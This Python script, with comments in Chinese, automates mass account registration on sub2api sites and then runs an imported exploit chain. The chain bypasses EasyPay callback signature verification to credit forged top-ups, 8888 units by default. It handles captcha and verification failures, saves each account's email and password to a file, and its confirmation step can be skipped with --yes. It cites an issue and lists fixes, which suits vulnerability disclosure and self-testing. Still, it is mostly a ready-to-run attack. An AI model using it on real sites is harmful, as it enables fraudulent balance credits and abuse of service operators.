#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 sub2api 自动注册 + 易支付(EasyPay)验签绕过复现 - 一体化脚本
 GitHub issue: https://github.com/Wei-Shaw/sub2api/issues/7881
================================================================================

 流程:
   1. 生成随机 gmail.com 邮箱 + 随机密码 (可用 --email/--password 固定)
   2. 调 POST /api/v1/auth/register 自动注册;
      目标要求邮箱验证码 (EMAIL_VERIFY_REQUIRED) -> 跳过该账号
   3. 注册成功后复用 sub2api_easypay_poc.py 的完整攻击链,
      测试伪造回调入账漏洞是否可复现

 用法:
   python sub2api_auto_register_poc.py --target https://site --yes
   python sub2api_auto_register_poc.py --target https://site --amount 100 --count 3
   python sub2api_auto_register_poc.py            # 交互式

 依赖: 同目录下的 sub2api_easypay_poc.py; 纯标准库 (装 rich 体验更佳)

 ! 法律声明: 本工具仅供安全研究/自查。仅限用于你自己部署或获得书面授权的
   目标。对未授权目标使用造成的任何后果由使用者自行承担。
================================================================================
"""

import argparse
import json
import os
import random
import string
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import sub2api_easypay_poc as poc

# Windows 控制台默认 GBK, 强制 UTF-8 输出避免中文乱码
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

DEFAULT_AMOUNT = 8888.0
SAVE_FILE = "poc_accounts.jsonl"

# 注册结果分类
R_OK = "ok"
R_VERIFY = "verify_required"   # 需要邮箱验证码 -> 跳过
R_CAPTCHA = "captcha"          # 人机验证 -> 无法自动注册
R_EXISTS = "email_exists"      # 邮箱已注册 -> 换一个
R_DISABLED = "disabled"        # 未开放注册
R_INVITATION = "invitation"    # 需要邀请码
R_OTHER = "other"


def rand_email(domain="gmail.com"):
    local = "".join(random.SystemRandom().choices(
        string.ascii_lowercase + string.digits, k=12))
    return f"poc{local}@{domain}"


def rand_password(length=16):
    """随机密码: 保证含大小写/数字/符号, 满足后端 min=6 及常见复杂度要求"""
    rng = random.SystemRandom()
    groups = [string.ascii_lowercase, string.ascii_uppercase,
              string.digits, "!@#$%^&*"]
    chars = [rng.choice(g) for g in groups]
    pool = "".join(groups)
    chars += [rng.choice(pool) for _ in range(max(length - len(chars), 0))]
    rng.shuffle(chars)
    return "".join(chars)


def classify_register_error(e):
    """把注册失败的 ApiError 归类, 决定跳过/换号/中止"""
    text = f"{e.reason} {e}".lower()
    if any(k in text for k in ("captcha", "turnstile", "tencent", "aliyun", "人机")):
        return R_CAPTCHA
    if "email_verify_required" in text or "verif" in text or "验证码" in text:
        return R_VERIFY
    if "email_exists" in text or "already exists" in text:
        return R_EXISTS
    if "registration_disabled" in text or "disabled" in text:
        return R_DISABLED
    if "invitation_code_required" in text or "invitation" in text:
        return R_INVITATION
    return R_OTHER


def register_account(client, args, email, password):
    """
    注册一个账号。返回 (status, data_or_err)。
    status==R_OK 时 data 为注册响应 dict (含 access_token)。
    """
    body = {"email": email, "password": password}
    if args.invitation_code:
        body["invitation_code"] = args.invitation_code
    try:
        data = client._call("POST", "/api/v1/auth/register", auth=False, json_body=body)
    except poc.ApiError as e:
        return classify_register_error(e), e
    return R_OK, data or {}


def save_record(path, rec):
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    except OSError:
        pass


def run_one(client, ui, args, email, password, amount):
    """
    注册 + 完整攻击链。返回 (status, verdict_or_none)。
    status 为 R_OK 表示攻击链已执行完毕 (verdict 有值)。
    """
    ui.step(0, 5, f"自动注册 {email}")
    status, data = register_account(client, args, email, password)

    if status == R_VERIFY:
        ui.warn("目标要求邮箱验证码, 跳过该账号 (--email 指定可用账号或手工注册)")
        return R_VERIFY, None
    if status == R_CAPTCHA:
        ui.fail(f"目标启用了人机验证(turnstile/captcha), 无法自动注册: {data}")
        return R_CAPTCHA, None
    if status == R_EXISTS:
        ui.warn("该邮箱已被注册, 将更换随机邮箱重试")
        return R_EXISTS, None
    if status == R_DISABLED:
        ui.fail(f"目标未开放注册: {data}")
        return R_DISABLED, None
    if status == R_INVITATION:
        ui.fail(f"目标要求邀请码: {data} (可用 --invitation-code 传入)")
        return R_INVITATION, None
    if status != R_OK:
        ui.fail(f"注册失败: {data}")
        return R_OTHER, None

    token = data.get("access_token")
    if not token:
        ui.fail("注册响应中没有 access_token")
        return R_OTHER, None
    client.token = token
    ui.ok(f"注册成功: {email}  密码: {password}")

    # 复用 PoC 的完整攻击链
    info = poc.get_checkout_info(client, ui)
    methods = poc.pick_methods(args, info)
    ui.info("将依次尝试支付通道: " + ", ".join(methods))
    result, evidence = poc.run_exploit(client, ui, amount, methods)
    ui.verdict(result, evidence)
    return R_OK, result


def main():
    ap = argparse.ArgumentParser(
        description="sub2api 自动注册 + 易支付验签绕过复现 (issue #7881) - 仅限授权测试")
    ap.add_argument("--target", help="目标站点, 如 https://example.com")
    ap.add_argument("--email", help="指定注册邮箱 (默认随机 gmail.com 邮箱; 仅对第 1 个账号生效)")
    ap.add_argument("--domain", default="gmail.com",
                    help="随机邮箱域名, 默认 gmail.com")
    ap.add_argument("--password", help="指定注册密码 (默认每个账号随机生成)")
    ap.add_argument("--invitation-code", help="邀请码 (目标强制邀请码时使用)")
    ap.add_argument("--amount", type=float, default=None,
                    help=f"充值(漏洞利用)金额, 默认 {DEFAULT_AMOUNT:.0f}")
    ap.add_argument("--count", type=int, default=1,
                    help="注册并测试的账号数量, 默认 1")
    ap.add_argument("--method", help="指定 payment_type (默认自动探测)")
    ap.add_argument("--no-save", action="store_true",
                    help=f"不把账号凭据追加保存到 {SAVE_FILE}")
    ap.add_argument("--insecure", action="store_true", help="跳过 TLS 证书校验")
    ap.add_argument("--plain", action="store_true", help="禁用 rich, 使用纯文本输出")
    ap.add_argument("--yes", action="store_true", help="跳过交互确认与金额询问")
    ap.add_argument("--timeout", type=int, default=20, help="HTTP 超时秒数")
    ap.add_argument("--verbose", "-v", action="store_true", help="打印原始报文细节")
    args = ap.parse_args()

    ui = poc.UI(plain=args.plain, verbose=args.verbose)
    ui.banner()

    target = poc.normalize_base(
        args.target or ui.ask("目标站点 URL", default="http://127.0.0.1:8080"))
    if not target:
        ui.fail("目标不能为空")
        return 2
    client = poc.Sub2ApiClient(target, timeout=args.timeout, insecure=args.insecure)

    # 金额: --amount 优先; 交互模式询问 (默认 8888); --yes 直接取默认
    amount = args.amount
    if amount is None:
        if args.yes or not sys.stdin.isatty():
            amount = DEFAULT_AMOUNT
        else:
            amount = poc.ask_amount(ui, default=DEFAULT_AMOUNT)
    if amount <= 0:
        ui.fail("金额必须为正数")
        return 2

    count = max(args.count, 1)
    ui.show_kv([
        ("目标", target),
        ("账号数量", count),
        ("充值金额", f"{amount:.2f}"),
        ("邮箱", args.email or f"随机 *@{args.domain}"),
        ("支付通道", args.method or "自动探测"),
    ], title="任务配置")

    if not args.yes and not ui.confirm(
            "确认对该目标执行 注册+完整攻击链? (必须是你的站点或已获授权)"):
        ui.warn("已取消。")
        return 0

    done, skipped_verify, fatal = 0, 0, None
    for i in range(count):
        if count > 1:
            ui._c(f"\n===== 账号 {i + 1}/{count} =====", "magenta")
        email = args.email if (args.email and i == 0) else rand_email(args.domain)
        password = args.password or rand_password()
        try:
            status, result = run_one(client, ui, args, email, password, amount)
        except poc.ApiError as e:
            ui.fail(f"流程中断: {e}")
            return 1
        except KeyboardInterrupt:
            ui.warn("\n用户中断。")
            return 130

        if status == R_OK:
            done += 1
            if not args.no_save:
                save_record(SAVE_FILE, {
                    "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "target": target, "email": email, "password": password,
                    "amount": amount,
                    "verdict": result["verdict"], "reason": result["reason"],
                })
                ui.info(f"凭据已追加保存到 {SAVE_FILE}")
            if result["verdict"] == poc.VULNERABLE:
                ui._c("\n修复建议 (来自 issue #7881):", "yellow")
                ui._c("  1. CanonicalizeReturnURL 剥离用户 query (parsed.RawQuery = \"\")")
                ui._c("  2. VerifyNotification 增加回调参数白名单, 未知参数直接拒绝")
                ui._c("  3. (可选) 入账后异步向上游 api.php 复核订单")
                ui._c("  4. 升级前临时缓解: 易支付实例切换到非 popup (扫码/mapi) 模式")
        elif status == R_VERIFY:
            skipped_verify += 1
        elif status in (R_CAPTCHA, R_DISABLED, R_INVITATION, R_OTHER):
            fatal = status
            break  # 换号也无法解决的错误, 直接中止

    if count > 1 or skipped_verify:
        ui.show_kv([
            ("完成测试", done),
            ("验证码跳过", skipped_verify),
            ("总数", count),
        ], title="汇总")

    if done == 0 and skipped_verify > 0 and fatal is None:
        ui.warn("所有账号均因需要邮箱验证码而跳过, 未执行漏洞测试。")
        return 3
    return 0 if done > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
